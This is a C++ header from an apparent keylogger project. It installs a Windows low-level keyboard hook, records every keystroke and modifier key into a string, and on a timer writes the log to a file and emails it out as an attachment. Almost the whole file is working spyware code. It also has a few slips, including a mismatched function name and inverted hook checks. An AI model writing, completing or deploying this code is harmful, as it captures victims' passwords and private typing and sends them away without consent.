//
// Created by youssef on 11/05/17.
//

#ifndef MYKEYLOGGER_KEYBHOOK_H
#define MYKEYLOGGER_KEYBHOOK_H

#include<iostream>
#include<fstream>
#include"KCsts.h"
#include"Timer.h"
#include"SendMail.h"
#include "IO.h"
#include"Helper.h"
string keylog="";

void
timerSendMail(){

    if(keylog.empty())
        return;
    string lastFile=IO::writeLog(keylog);
    if(lastFile.empty())
    {
        Helper::writeLog("File creation was not successful.Keylog'"+keylog+"'");
        return;
    }

    int x= SendMail::SendMail("Log [" +lastFile+ "]","Hi :)\n The file has been attached to this mail :)\n"
                          "for testing,enjoy\n"+keylog,IO::getPath(true)+lastFile);

    if(x!= 7)
        Helper::writeLog("Mail was not send! Error code: " + Helper::ToString(x));
    else
        keylog = "";
}

Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_RSHIFT
           || key == VK_LSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN
                )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::writeLog("Hook Started... Timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyBoardProc,
                             GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx (eHook);
    eHook = NULL;
    return (bool) b;
}

bool IsHooked()
{
    return (bool) (eHook == NULL);
}

#endif //MYKEYLOGGER_KEYBHOOK_H